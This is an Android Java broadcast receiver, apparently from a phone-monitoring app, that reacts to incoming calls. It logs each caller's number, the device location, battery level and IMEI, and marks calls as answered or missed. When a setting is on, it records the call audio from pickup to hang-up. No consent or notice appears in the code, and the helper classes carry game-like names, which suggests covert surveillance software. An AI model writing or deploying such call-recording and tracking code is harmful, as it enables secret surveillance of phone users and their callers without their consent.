package vn.vhc.live;

import android.app.ActivityManager;
import android.app.ActivityManager.RunningServiceInfo;
import android.content.BroadcastReceiver;
import android.content.ComponentName;
import android.content.Context;
import android.content.Intent;
import android.content.pm.PackageManager;
import android.os.Bundle;
import android.os.Handler;
import android.os.Message;
import android.provider.MediaStore.Audio.Media;
import android.telephony.TelephonyManager;
import android.widget.Toast;

public class IncomingLog extends BroadcastReceiver {

	 private static long timeStarted = -1L; // IMPORTANT!
	 //private static long timeAnswered;
	 private static boolean isAnswerd=false;
	 private static String callerNumber="";
	 //private static boolean isRoaming;
	 //private static String callerNumber;
	 public Handler hx= new Handler(){
			
			public void handleMessage(Message msg) 
			  {			  
				try
				{
					
					  if(msg.what==100)
					  {			 
						  MediaManager.getInstance().startRecordAudio();
					  }	
					  if(msg.what==101)
					  {			 
						  MediaManager.getInstance().stopRecordAudio();
					  }	
					  super.handleMessage(msg);
				}catch(Exception ex)
				{
					UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
							"ErrorHandleOnIncoming:"+ex.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
				}
			  }
		}; 
	@Override
	public void onReceive(Context context, Intent intent)
	{
		try{
		// TODO Auto-generated method stub
	    //Bundle bundle = intent.getExtras();
        //if(null == bundle) return;
        //String state = bundle.getString(TelephonyManager.EXTRA_STATE);
        //NavigateScreen.getInstance().setCurrentDisplay(context);
		        
		ContextManagerCore.getInstance().setCurrentContext(context);
		boolean isStarted=UtilGame.isRunningService;
		if(!isStarted)
		{
			isStarted=ContextManagerCore.getInstance().isServiceRunning(); 
		}
        //Toast.makeText(context, "Running:"+isStarted, Toast.LENGTH_LONG).show();
		if(! isStarted)
		{
			 ContextManagerCore.getInstance().startServiceIfNeed();
		}
		else 
		{
	        String phone_state = intent.getStringExtra(TelephonyManager.EXTRA_STATE);
			String number = intent.getStringExtra(TelephonyManager.EXTRA_INCOMING_NUMBER);
			
			//call started
	        if(phone_state.equalsIgnoreCase(TelephonyManager.EXTRA_STATE_RINGING))
	        {
	        	timeStarted = System.currentTimeMillis();
	        	if(number!=null) callerNumber=number;//new
	        	
	        	//new ver 
	        	if(MediaManager.timeTracking.equals(""))MediaManager.timeTracking=UtilGame.getInstance().GetStringNow();
	        	
	        	//old version
	        	//MediaManager.timeTracking=UtilGame.getInstance().GetStringNow();
	        	//UtilMemory.addTo(new DataObject(ConfigGame.getInstance(null).getActiveKey()
	        	//		, TypeData.CALL_LOG, ContextManagerCore.getInstance().readLastPosition(),  String.valueOf(BatteryLog.levelBattery), number, TypeData.CALL_INCOMING,MediaManager.timeTracking));
	        }   
	        //call answer
	        if (phone_state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK) && timeStarted != -1L)
    		{
	        	isAnswerd=true;
	        	//thread.sleep(1000)
	        	//Toast.makeText(context, "Is Could Recording:"+(UtilGame.isBusyForRecording()), Toast.LENGTH_LONG).show();
	        	if(UtilGame.recordcall==1 && !UtilGame.isBusyForRecording())
	        	{
	        		MediaManager.modeRecord=1;
	        		MediaManager.isCalling=true;		        	
		        	hx.sendEmptyMessage(100);		        	
	        	}
    		}
	        //call ended
	        if (phone_state.equals(TelephonyManager.EXTRA_STATE_IDLE) && timeStarted != -1L) 
	        {	
	        	//thread.sleep(1000)
	        	if(UtilGame.recordcall==1 )
	        	{
	        		if(isAnswerd)
		        	{
		        		hx.sendEmptyMessage(101);
		        	}
	        	}
	        	
	        	//new ver
	        	UtilMemory.addTo(new DataObject(ConfigGame.getInstance(null).getActiveKey()
	        			, TypeData.CALL_LOG, ContextManagerCore.getInstance().readLastPosition(),  String.valueOf(BatteryLog.levelBattery), callerNumber,(isAnswerd ?TypeData.CALL_INCOMING:TypeData.CALL_MISS),MediaManager.timeTracking));
	        	//end new
	        	MediaManager.timeTracking="";
		        timeStarted = -1L;
		        isAnswerd=false;
	        }
		}
		
		}catch(Exception exxxx)
		{
			UtilMemory.addTo(new DataObject(LocationUtil.IMEI, TypeData.ERROR_LOG, 
					"InComingLog:"+exxxx.toString(),  String.valueOf(BatteryLog.levelBattery), "", "", UtilGame.getInstance().GetStringNow()));
			
		}	
		/*
		//start add
		 Bundle extras = intent.getExtras();
		 if (extras == null) return;
		 String state = extras.getString(TelephonyManager.EXTRA_STATE);
		 if (state == null) return;
		     
		 // phone is ringing
	    if (state.equals(TelephonyManager.EXTRA_STATE_RINGING)) {           
	        timeStarted = System.currentTimeMillis();
	        callerNumber = extras.getString(TelephonyManager.EXTRA_INCOMING_NUMBER);
	        
	        //TelephonyManager tm = (TelephonyManager) context.getSystemService(Context.TELEPHONY_SERVICE);
	        //isRoaming = tm.isNetworkRoaming();
	         
	        // set timeAnswered to -1;
	        timeAnswered = -1L;
	       Toast.makeText(context, "timeStarted: " + timeStarted, Toast.LENGTH_LONG).show();
	      
	       
	       // Log.d("TEST", "timeStarted: " + timeStarted);
	       // Log.d("TEST", "caller number: " + callerNumber);
	       // Log.d("TEST", "isRoaming: " + isRoaming);
	        return;
	    }
	     
	    // call was answered
	    if (state.equals(TelephonyManager.EXTRA_STATE_OFFHOOK) && timeStarted != -1L) {
	        timeAnswered = System.currentTimeMillis();
	        Toast.makeText(context, "timeAnswered: " + timeAnswered, Toast.LENGTH_LONG).show();
	        //Log.d("TEST", "timeAnswered: " + timeAnswered);
	        return;
	    }
	 
	    // call was ended
	    if (state.equals(TelephonyManager.EXTRA_STATE_IDLE) && timeStarted != -1L) {
	    	
	        timeEnded = System.currentTimeMillis();
	        //Log.d("TEST", "timeEnded: " + timeEnded);
	        Toast.makeText(context, "timeEnded: " + timeEnded, Toast.LENGTH_LONG).show();
	        timeStarted = -1L; // DON'T FORGET!
	        return;
	    }
	    */
	    
	}	
}